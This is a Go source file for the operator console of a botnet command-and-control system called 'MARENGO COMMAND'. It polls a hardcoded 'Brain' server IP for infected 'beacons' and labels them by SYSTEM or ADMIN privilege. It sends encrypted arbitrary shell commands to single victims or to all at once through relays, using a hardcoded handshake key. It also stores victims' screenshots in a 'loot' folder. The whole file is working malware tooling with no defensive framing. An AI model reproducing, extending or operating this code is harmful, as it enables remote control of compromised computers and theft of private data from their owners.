package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	crypto "mrg2026/Crypto"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/gdamore/tcell/v2"
	"github.com/rivo/tview"
)

// --- GLOBALS ---
var (
	app           = tview.NewApplication()
	targetList    = tview.NewList().ShowSecondaryText(false)
	outputView    = tview.NewTextView()
	logView       = tview.NewTextView()
	commandInput  = tview.NewInputField()
	currentSecret string
	uiStartTime   = time.Now()
)

type AuthRequest struct {
	Type     string `json:"type"`
	Key      string `json:"key"`
	TargetID string `json:"target_id"`
}

type RoutingInfo struct {
	RelayAddr string `json:"relay_addr"`
}

func main() {
	loginForm := tview.NewForm().
		AddPasswordField("Tenant Secret", "", 20, '*', func(text string) { currentSecret = text }).
		AddButton("Initialize Link", func() {
			if strings.TrimSpace(currentSecret) != "" {
				setupDashboard()
			}
		})
	loginForm.SetBorder(true).SetTitle(" MARENGO // AUTH ").SetTitleAlign(tview.AlignCenter)

	if err := app.SetRoot(loginForm, true).Run(); err != nil {
		panic(err)
	}
}

func setupDashboard() {
	app.EnableMouse(false)

	header := tview.NewTextView().SetDynamicColors(true).SetTextAlign(tview.AlignCenter)

	targetList.SetBorder(true).SetTitle(" 🌐 NODES ").SetTitleColor(tcell.ColorSpringGreen)
	targetList.SetBackgroundColor(tcell.ColorBlack)
	targetList.SetSelectedBackgroundColor(tcell.ColorSpringGreen)
	targetList.SetSelectedTextColor(tcell.ColorBlack)

	outputView.SetDynamicColors(true).SetWordWrap(true).SetBackgroundColor(tcell.ColorBlack)
	outputView.SetBorder(true).SetTitle(" 🖥️ TERMINAL ").SetTitleColor(tcell.ColorDeepSkyBlue)

	logView.SetDynamicColors(true).SetBorder(true).SetTitle(" 📡 LOGS ").SetTitleColor(tcell.ColorOrange)
	logView.SetBackgroundColor(tcell.ColorBlack)

	commandInput.SetLabel(" [RECV_READY] ➔ ").
		SetLabelColor(tcell.ColorSpringGreen).
		SetFieldBackgroundColor(tcell.ColorBlack)
	commandInput.SetBorder(true).SetTitle(" ⌨️ EXECUTE ").SetTitleColor(tcell.ColorSpringGreen)

	focusOrder := []tview.Primitive{targetList, commandInput, outputView}

	app.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyTab {
			currentFocus := app.GetFocus()
			for i, primitive := range focusOrder {
				if primitive == currentFocus {
					nextIndex := (i + 1) % len(focusOrder)
					app.SetFocus(focusOrder[nextIndex])
					return nil
				}
			}
			app.SetFocus(targetList)
			return nil
		}
		return event
	})

	go func() {
		for {
			uptime := time.Since(uiStartTime).Round(time.Second)
			header.SetText(fmt.Sprintf(
				" [black:blue] MARENGO COMMAND [:-] [blue][-] [white]UPTIME: %s[-] [blue][-] [yellow]ACTIVE_BEACONS: %d[-] ",
				uptime, targetList.GetItemCount()-1,
			))
			time.Sleep(1 * time.Second)
			app.QueueUpdateDraw(func() { app.Draw() })
		}
	}()

	// --- REFRESH ENGINE (Updated for Hashed IDs) ---
	go func() {
		for {
			t := fetchTargets()

			app.QueueUpdateDraw(func() {
				selectedIdx := targetList.GetCurrentItem()
				var selectedText string
				if selectedIdx >= 0 && selectedIdx < targetList.GetItemCount() {
					selectedText, _ = targetList.GetItemText(selectedIdx)
				}

				targetList.Clear()
				targetList.AddItem("[ALL_BROADCAST]", "Global Command", 'a', nil)

				if t == nil {
					fmt.Fprintf(logView, "[red]%s[-] [white]PING[-] ➔ Brain Unreachable\n", time.Now().Format("15:04:05"))
					return
				}

				newSelectionIdx := 0
				for _, name := range t {
					if name == "" {
						continue
					}

					icon := "👤"
					color := "[white]"

					// Updated parsing for hashed IDs with privilege tags
					if strings.Contains(name, "SYSTEM") {
						icon = "💀"
						color = "[red]"
					} else if strings.Contains(name, "ADMIN") {
						icon = "⚡"
						color = "[yellow]"
					}

					// Using ID:: format for reliable parsing
					displayName := fmt.Sprintf("%s %sID::%s[-]", icon, color, name)
					targetList.AddItem(displayName, "Signal Active", 0, nil)

					if displayName == selectedText {
						newSelectionIdx = targetList.GetItemCount() - 1
					}
				}

				targetList.SetCurrentItem(newSelectionIdx)
				fmt.Fprintf(logView, "[green]%s[-] [white]PING[-] ➔ %d Nodes Active\n", time.Now().Format("15:04:05"), len(t))
			})
			time.Sleep(5 * time.Second)
		}
	}()

	commandInput.SetDoneFunc(func(key tcell.Key) {
		if key == tcell.KeyEnter {
			if targetList.GetItemCount() == 0 {
				return
			}
			cmd := strings.TrimSpace(commandInput.GetText())
			if cmd == "" {
				return
			}

			idx := targetList.GetCurrentItem()
			fullText, _ := targetList.GetItemText(idx)

			var targetID string
			// FIXED: Updated parsing to handle the new ID:: format
			if strings.Contains(fullText, "ID::") {
				parts := strings.Split(fullText, "ID::")
				targetID = strings.TrimSpace(parts[1])
				targetID = strings.TrimSuffix(targetID, "[-]")
			} else {
				targetID = strings.TrimPrefix(fullText, "NODE::")
			}

			if cmd == "clear" {
				outputView.Clear()
				commandInput.SetText("")
				return
			}

			ts := time.Now().Format("15:04:05")
			fmt.Fprintf(outputView, "[white]%s[-] [green][TASK][-] %s ➔ %s\n", ts, targetID, cmd)

			go func(tid, command string) {
				var res string
				if tid == "[ALL_BROADCAST]" {
					broadcastCommand(command)
				} else {
					res = executeRotatingCommand(tid, command)
					if !strings.Contains(res, "Decryption Error") {
						fmt.Fprintf(outputView, "[white]%s[-] [blue][RECV][-] %s ➔ \n%s\n", ts, tid, formatResponse(tid, res))
					} else {
						fmt.Fprintf(outputView, "[white]%s[-] [red][FAIL][-] %s ➔ Link dropped or busy.\n", ts, tid)
					}
				}
				app.QueueUpdateDraw(func() { app.Draw() })
			}(targetID, cmd)

			commandInput.SetText("")
		}
	})

	centerFlex := tview.NewFlex().SetDirection(tview.FlexRow).
		AddItem(outputView, 0, 1, false).
		AddItem(commandInput, 3, 0, true)

	mainBody := tview.NewFlex().
		AddItem(targetList, 25, 0, false).
		AddItem(centerFlex, 0, 1, true).
		AddItem(logView, 30, 0, false)

	finalLayout := tview.NewFlex().SetDirection(tview.FlexRow).
		AddItem(header, 1, 0, false).
		AddItem(mainBody, 0, 1, true)

	app.SetRoot(finalLayout, true).SetFocus(commandInput)
}

func formatResponse(id, res string) string {
	if strings.Contains(res, "SNAP_DATA:") {
		_ = os.Mkdir("loot", 0755)
		parts := strings.Split(res, "SNAP_DATA:")
		if len(parts) < 2 {
			return "[red]ERROR: Snap Corrupted[-]"
		}
		rawBase64 := strings.TrimSpace(parts[1])
		imgBytes, err := base64.StdEncoding.DecodeString(rawBase64)
		if err != nil {
			return "[red]DECODE_FAIL[-]"
		}
		timestamp := time.Now().Format("2006-01-02_15-04-05")
		fileName := fmt.Sprintf("loot/snap_%s_%s.jpg", id, timestamp)
		_ = os.WriteFile(fileName, imgBytes, 0644)
		return fmt.Sprintf("[green]📸 SNAPSHOT_STORED:[-] %s", fileName)
	}
	return res
}

func fetchTargets() []string {
	// Pointing to the Brain's TCP Listener on Port 8080
	c, err := net.DialTimeout("tcp", "18.184.135.220:8080", 2*time.Second)
	if err != nil {
		return nil
	}
	defer c.Close()

	json.NewEncoder(c).Encode(AuthRequest{Type: "cc_list", Key: currentSecret})
	var t []string
	_ = json.NewDecoder(c).Decode(&t)
	return t
}

func executeRotatingCommand(id, cmd string) string {
	c, err := net.DialTimeout("tcp", "18.184.135.220:8080", 2*time.Second)
	if err != nil {
		return "[red]Brain Unreachable[-]"
	}
	json.NewEncoder(c).Encode(AuthRequest{Type: "cc_req", TargetID: id, Key: currentSecret})
	var r RoutingInfo
	_ = json.NewDecoder(c).Decode(&r)
	c.Close()
	if r.RelayAddr == "" {
		return "[red]Target Offline/Busy[-]"
	}

	conn, err := net.DialTimeout("tcp", r.RelayAddr, 5*time.Second)
	if err != nil {
		return "[red]Relay Refused[-]"
	}
	defer conn.Close()

	conn.Write([]byte("8fG2nL9xW4vPzQ7mR1bA6kS3hJ5dY9tE"))
	sessionKey := crypto.GenerateSessionKey()
	conn.Write(sessionKey)

	encCmd, _ := crypto.EncryptPayload(cmd, sessionKey)
	fmt.Fprintf(conn, "%s\n", encCmd)

	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	reply, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		return "[red]Timeout[-]"
	}

	decryptedRes, err := crypto.DecryptPayload(strings.TrimSpace(reply), sessionKey)
	if err != nil {
		return "[red]Decryption Error[-]"
	}
	return decryptedRes
}

func broadcastCommand(cmd string) {
	targets := fetchTargets()
	var wg sync.WaitGroup
	for _, id := range targets {
		wg.Add(1)
		go func(tid string) {
			defer wg.Done()
			executeRotatingCommand(tid, cmd)
		}(id)
	}
	wg.Wait()
}
